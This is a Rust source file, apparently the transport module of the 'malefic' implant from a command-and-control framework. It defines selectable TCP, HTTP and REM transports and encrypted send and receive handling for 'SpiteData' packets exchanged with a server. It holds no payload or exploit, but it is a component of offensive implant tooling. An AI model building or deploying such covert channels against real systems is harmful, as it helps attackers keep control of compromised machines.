#[cfg(feature = "tcp")]
pub mod tcp;
#[cfg(feature = "transport_http")]
pub mod http;
#[cfg(feature = "transport_rem")]
pub mod rem;

use anyhow::Result;
use async_trait::async_trait;
use futures::lock::Mutex;
use futures::{join, FutureExt};
use futures_timer::Delay;
use malefic_helper::debug;
use malefic_proto::crypto::{Cryptor, CryptorError};
use malefic_proto::{parser_header, SpiteData, HEADER_LEN};
use std::io;
use std::sync::Arc;
use std::time::Duration;
use thiserror::Error;

#[async_trait]
pub trait ListenerExt: Sized {
    async fn bind(addr: &str) -> anyhow::Result<Self>;
    async fn accept(&mut self) -> anyhow::Result<impl TransportTrait>;
}

#[async_trait]
pub trait DialerExt {
    async fn connect(&mut self, addr: &str) -> anyhow::Result<impl TransportTrait>;
}


cfg_if::cfg_if! {
    if #[cfg(feature = "transport_tcp")] {
        pub use tcp::TCPTransport as InnterTransport;
        pub use tcp::TCPClient as Client;
    } else if #[cfg(feature = "transport_http")] {
        pub use http::HTTPTransport as InnterTransport;
        pub use http::HTTPClient as Client;
    } else if #[cfg(feature = "transport_rem")] {
        pub use rem::REMTransport as InnterTransport;
        pub use rem::REMClient as Client;
    } else {
        compile_error!("No transport selected");
    }
}

#[cfg(feature = "bind")]
cfg_if::cfg_if! {
    if #[cfg(feature = "transport_tcp")] {
        pub use tcp::TCPListenerExt as Listener;
    } else {
        compile_error!("No transport selected");
    }
}

#[derive(Error, Debug)]
pub enum TransportError {
    #[error(transparent)]
    AnyHowError(#[from] anyhow::Error),

    #[error("Failed to connect to the server")]
    ConnectionError,

    #[error("Failed to encrypt/decrypt data")]
    CryptorError(#[from] CryptorError),

    #[error("Failed to send data")]
    SendError,

    #[error("Failed to send data within the timeout")]
    SendTimeout,

    #[error("Failed to receive data")]
    RecvError,

    #[error("I/O Error: {0}")]
    IoError(#[from] io::Error), // 转换标准库的 I/O 错误

    #[error("Parser error: {0}")]
    ParserError(#[from] malefic_proto::ParserError),

    #[error("Unexpected end of stream")]
    UnexpectedEof,

    #[error("Unknown error occurred")]
    UnknownError,
}

#[async_trait]
pub trait TransportTrait: Send + Sync {
    async fn recv(&mut self, len: usize) -> Result<Vec<u8>>;
    async fn send(&mut self, data: Vec<u8>) -> Result<usize>;
    async fn done(&mut self) -> Result<()>;
    async fn close(&mut self) -> Result<bool>;
}

#[derive(Clone)]
pub struct Transport {
    pub innter: InnterTransport,
    pub write_lock: Arc<Mutex<bool>>,
    pub read_lock: Arc<Mutex<bool>>,
}

impl Transport {
    pub fn new(transport: InnterTransport) -> Self {
        Transport {
            innter: transport,
            write_lock: Arc::new(Mutex::new(false)),
            read_lock: Arc::new(Mutex::new(false)),
        }
    }

    pub async fn write_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.write_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    pub async fn write_over(&self) {
        let mut lock = self.write_lock.lock().await;
        *lock = true;
    }

    pub async fn read_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.read_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    pub async fn read_over(&self) {
        let mut lock = self.read_lock.lock().await;
        *lock = true;
    }

    pub async fn recv(&mut self, len: usize) -> Result<Vec<u8>> {
        let data = self.innter.recv(len).await?;
        Ok(data)
    }

    pub async fn send(&mut self, data: Vec<u8>) -> Result<usize> {
        let n = self.innter.send(data).await?;
        Ok(n)
    }
    
    pub async fn done(&mut self) -> Result<()> {
        let res = self.innter.done().await?;
        Ok(res)
    }
    pub async fn close(&mut self) -> Result<bool> {
        let res = self.innter.close().await?;
        Ok(res)
    }
}

#[derive(Clone)]
pub struct Stream {
    pub cryptor: Cryptor,
}

impl Stream {
    pub async fn send(&mut self, mut transport: Transport, data: Vec<u8>) -> Result<usize> {
        let data = self.cryptor.encrypt(data)?;
        transport.send(data).await
    }

    pub async fn recv(&mut self, mut transport: Transport, len: usize) -> Result<Vec<u8>> {
        let data = transport.recv(len).await?;
        debug!("[transport] recv expect:{} {}", len, data.len());
        if data.len() != len {
            return Err(TransportError::RecvError.into());
        }
        Ok(self.cryptor.decrypt(data)?)
    }
    
    pub fn reset(&mut self) {
        self.cryptor.reset();
    }
}



impl Client {
    pub fn new(cryptor: Cryptor) -> Self {
        #[cfg(feature = "transport_rem")]
        {
            let _ = malefic_helper::common::rem::rem_dial(&crate::config::REM).map_err(|e| {
                debug!("[transport] REM dial error: {}", e);
                TransportError::ConnectionError
            });
        }
        Client {
            stream: Stream { cryptor },
        }
    }
    pub async fn handler(
        &mut self,
        mut transport: Transport,
        data: SpiteData,
    ) -> Result<Option<SpiteData>> {
        self.stream.cryptor.reset();

        let mut sender = self.clone();
        let mut receiver = self.clone();
        let send_task = sender.send(transport.clone(), data).fuse();
        let recv_task = receiver.recv(transport.clone()).fuse();
        let (recv_result, send_result) = join!(recv_task, send_task);

        let _ = transport.close().await?;

        if let Err(e) = send_result {
            debug!("[client] send error: {:?}", e);
            return Err(e.into());
        }

        match recv_result {
            Ok(data) => Ok(Some(data)),
            Err(e) => {
                debug!("[client] recv error: {:?}", e);
                Ok(None)
            }
        }
    }

    pub async fn send(&mut self, mut transport: Transport, data: SpiteData) -> Result<()> {
        let n = self.stream.send(transport.clone(), data.header()).await?;
        if n == data.header().len() {
            debug!("[transport] send header success");
        } else {
            return Err(TransportError::SendError.into());
        }

        let body = data.body();
        let n = self.stream.send(transport.clone(), body.clone()).await?;
        if n == body.len() {
            transport.done().await?;
            transport.write_over().await;
            debug!("[transport] send over");
            transport.read_wait().await.ok();
        } else {
            return Err(TransportError::SendError.into());
        }

        Ok(())
    }

    pub async fn recv(&mut self, transport: Transport) -> Result<SpiteData> {
        futures::select! {
            res = self.stream.recv(transport.clone(), HEADER_LEN).fuse() => {
                match res {
                    Ok(response_data) if response_data.len() == HEADER_LEN => {
                        let mut spitedata = parser_header(&response_data)?;
                        debug!("[client] recv header success: {:?}, {}", response_data, spitedata.length);
                        let data = self.stream.recv(transport.clone(), spitedata.length as usize + 1).await?;
                        spitedata.set_data(data)?;
                        transport.read_over().await;
                        debug!("[client] recv over");
                        Ok(spitedata)
                    }
                    Ok(_) => {
                        debug!("[client] recv: {:?}", res);
                        transport.read_over().await;
                        Err(TransportError::RecvError.into())
                    }
                    Err(e) => {
                        transport.read_over().await;
                        Err(e)
                    }
                }
            },
            _ = transport.write_wait().fuse() => {
                transport.read_over().await;
                Err(TransportError::SendTimeout.into())
            }
        }
    }
}
